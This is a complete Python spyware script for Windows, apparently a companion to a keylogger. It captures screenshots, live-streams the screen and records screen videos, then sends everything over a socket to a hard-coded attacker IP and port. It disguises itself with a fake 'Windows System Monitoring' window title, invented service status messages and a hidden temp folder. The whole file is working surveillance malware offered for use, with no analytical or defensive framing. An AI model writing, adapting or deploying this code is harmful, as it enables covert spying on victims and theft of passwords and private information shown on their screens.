import socket
import threading
import time
import os
import sys
import ctypes
import base64
import zlib
from datetime import datetime

# Choose one or both features
ENABLE_SCREENSHOTS = True
ENABLE_LIVE_STREAMING = True

# Third-party library imports with fallback mechanisms
try:
    import numpy as np
    import cv2
    OPENCV_AVAILABLE = True
except ImportError:
    OPENCV_AVAILABLE = False
    print("[!] OpenCV not available - falling back to PIL")

try:
    from PIL import ImageGrab, Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    if not OPENCV_AVAILABLE:
        print("[!] Error: Neither OpenCV nor PIL available. Please install one of them.")
        sys.exit(1)

# Make window title look like a system process
ctypes.windll.kernel32.SetConsoleTitleW("Windows System Monitoring")

# Configuration
ATTACKER_IP = "10.3.1.200"  # Change to your attacker machine's IP
ATTACKER_PORT = 5555  # Using a different port than the keylogger

# Quality settings for screenshots/streaming
COMPRESSION_QUALITY = 30  # Lower = smaller file size but worse quality (1-100)
FRAME_RATE = 1  # Frames per second for live streaming or screenshot intervals

# Buffer size for network transmission
CHUNK_SIZE = 4096

# For video recording
VIDEO_FILE_PATH = os.path.join(os.getenv('TEMP'), "sysdata")
os.makedirs(VIDEO_FILE_PATH, exist_ok=True)

# Connection status
connected = False
client_socket = None

def try_connect():
    """Establish connection to the attacker server"""
    global client_socket, connected
    
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((ATTACKER_IP, ATTACKER_PORT))
        connected = True
        print("[System] Monitoring service connected")
        return True
    except Exception as e:
        connected = False
        print(f"[System] Monitoring service offline - will retry")
        return False

def connection_manager():
    """Maintain connection to the attacker server"""
    global connected
    
    while True:
        if not connected:
            try_connect()
        time.sleep(10)  # Check connection every 10 seconds

def capture_screenshot():
    """Capture a screenshot using the best available method"""
    if PIL_AVAILABLE:
        # PIL method
        screenshot = ImageGrab.grab()
        img_np = np.array(screenshot)
        img_rgb = cv2.cvtColor(img_np, cv2.COLOR_BGR2RGB) if OPENCV_AVAILABLE else img_np
        return img_rgb
    elif OPENCV_AVAILABLE:
        # OpenCV method (Windows only)
        import win32gui
        import win32ui
        import win32con
        import win32api
        
        # Get the handle of the desktop window
        hdesktop = win32gui.GetDesktopWindow()
        
        # Get the dimensions of the screen
        width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
        
        # Create a device context
        desktop_dc = win32gui.GetWindowDC(hdesktop)
        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
        mem_dc = img_dc.CreateCompatibleDC()
        
        # Create a bitmap object
        screenshot = win32ui.CreateBitmap()
        screenshot.CreateCompatibleBitmap(img_dc, width, height)
        mem_dc.SelectObject(screenshot)
        mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
        
        # Convert the bitmap to an array
        signedIntsArray = screenshot.GetBitmapBits(True)
        img = np.frombuffer(signedIntsArray, dtype='uint8')
        img.shape = (height, width, 4)
        
        # Free resources
        mem_dc.DeleteDC()
        win32gui.DeleteObject(screenshot.GetHandle())
        
        # Return BGR image for OpenCV
        return cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
    
    return None

def compress_image(image, quality=COMPRESSION_QUALITY):
    """Compress the image to reduce network traffic"""
    if OPENCV_AVAILABLE:
        # OpenCV compression method
        encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), quality]
        _, img_encoded = cv2.imencode('.jpg', image, encode_param)
        return img_encoded
    elif PIL_AVAILABLE:
        # PIL compression method
        pil_img = Image.fromarray(image)
        from io import BytesIO
        buffer = BytesIO()
        pil_img.save(buffer, format="JPEG", quality=quality)
        return buffer.getvalue()
    
    return None

def send_screenshot():
    """Capture and send a screenshot to the attacker"""
    global client_socket, connected
    
    if not connected:
        try_connect()
        if not connected:
            return False
    
    try:
        # Capture the screenshot
        screenshot = capture_screenshot()
        if screenshot is None:
            return False
        
        # Compress the image
        compressed_img = compress_image(screenshot)
        if compressed_img is None:
            return False
        
        # Convert to base64 for safer transmission
        img_data = base64.b64encode(compressed_img)
        
        # Add timestamp
        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        
        # Create header with data type and size
        header = f"SCREENSHOT:{timestamp}:{len(img_data)}\n"
        
        # Send the header
        client_socket.send(header.encode())
        
        # Send the image data in chunks
        for i in range(0, len(img_data), CHUNK_SIZE):
            chunk = img_data[i:i+CHUNK_SIZE]
            client_socket.send(chunk)
        
        # Send end marker
        client_socket.send(b"END\n")
        
        return True
    except Exception as e:
        connected = False
        print(f"[System] Network error: {e}")
        return False

def periodic_screenshots():
    """Take screenshots at regular intervals"""
    while True:
        if ENABLE_SCREENSHOTS:
            success = send_screenshot()
            if success:
                print(f"[System] System monitor data updated: {datetime.now().strftime('%H:%M:%S')}")
        
        # Wait for the next interval
        time.sleep(1/FRAME_RATE if FRAME_RATE > 0 else 60)

def screen_recording():
    """Record the screen to a video file and periodically send it"""
    if not OPENCV_AVAILABLE:
        print("[System] OpenCV required for screen recording")
        return
    
    # Use the current timestamp for the filename
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    video_file = os.path.join(VIDEO_FILE_PATH, f"sys_{timestamp}.mp4")
    
    # Get screen dimensions
    screen = capture_screenshot()
    height, width = screen.shape[:2]
    
    # Define the codec and create a VideoWriter object
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(video_file, fourcc, FRAME_RATE, (width, height))
    
    recording_start_time = time.time()
    frames_recorded = 0
    
    try:
        # Record for a fixed duration (e.g., 5 minutes)
        while time.time() - recording_start_time < 300:  # 5 minutes
            screen = capture_screenshot()
            if screen is not None:
                out.write(screen)
                frames_recorded += 1
                
                # Sleep to maintain target frame rate
                time.sleep(1/FRAME_RATE)
        
        # Release the VideoWriter
        out.release()
        
        # Send the recorded video file
        send_video_file(video_file)
        
        # Clean up
        if os.path.exists(video_file):
            os.remove(video_file)
    
    except Exception as e:
        print(f"[System] Recording error: {e}")
        if out:
            out.release()

def send_video_file(video_path):
    """Send a recorded video file to the attacker"""
    global client_socket, connected
    
    if not connected:
        try_connect()
        if not connected:
            return False
    
    try:
        # Read the video file
        with open(video_path, 'rb') as f:
            video_data = f.read()
        
        # Compress the data
        compressed_data = zlib.compress(video_data)
        
        # Convert to base64
        encoded_data = base64.b64encode(compressed_data)
        
        # Send header
        filename = os.path.basename(video_path)
        header = f"VIDEO:{filename}:{len(encoded_data)}\n"
        client_socket.send(header.encode())
        
        # Send data in chunks
        for i in range(0, len(encoded_data), CHUNK_SIZE):
            chunk = encoded_data[i:i+CHUNK_SIZE]
            client_socket.send(chunk)
        
        # Send end marker
        client_socket.send(b"END\n")
        
        return True
    except Exception as e:
        connected = False
        print(f"[System] Video transmission error: {e}")
        return False

def live_streaming():
    """Stream the screen to the attacker in near real-time"""
    while True:
        if ENABLE_LIVE_STREAMING and connected:
            send_screenshot()
        time.sleep(1/FRAME_RATE)

def fake_system_activity():
    """Display fake system messages to look legitimate"""
    services = [
        "System Health Monitor", 
        "Performance Metrics", 
        "Resource Tracker",
        "System Diagnostics",
        "Hardware Monitor"
    ]
    
    activities = [
        "Scanning", 
        "Processing", 
        "Analyzing", 
        "Monitoring", 
        "Optimizing"
    ]
    
    import random
    
    while True:
        service = random.choice(services)
        activity = random.choice(activities)
        print(f"[System] {service}: {activity} | {time.strftime('%H:%M:%S')}")
        time.sleep(random.uniform(10, 20))

def main():
    """Main function to initialize everything"""
    # Make directory for hidden files
    os.makedirs(VIDEO_FILE_PATH, exist_ok=True)
    
    # Try to connect immediately
    try_connect()
    
    # Start a thread for connection management
    conn_thread = threading.Thread(target=connection_manager, daemon=True)
    conn_thread.start()
    
    # Start a thread for the fake system activity
    fake_thread = threading.Thread(target=fake_system_activity, daemon=True)
    fake_thread.start()
    
    # Start screen monitoring based on configuration
    if ENABLE_SCREENSHOTS:
        screenshot_thread = threading.Thread(target=periodic_screenshots, daemon=True)
        screenshot_thread.start()
    
    if ENABLE_LIVE_STREAMING:
        stream_thread = threading.Thread(target=live_streaming, daemon=True)
        stream_thread.start()
    
    print("[System] Windows System Monitoring active...")
    print("[System] Press Ctrl+C to exit")
    
    try:
        # Main thread will start recording videos periodically
        while True:
            if OPENCV_AVAILABLE:
                # Record a video every 10 minutes
                screen_recording()
                time.sleep(300)  # 5 minutes between recordings
            else:
                # If OpenCV isn't available, just sleep
                time.sleep(60)
    except KeyboardInterrupt:
        print("[System] Windows System Monitoring shutting down...")
        sys.exit(0)

if __name__ == "__main__":
    main()
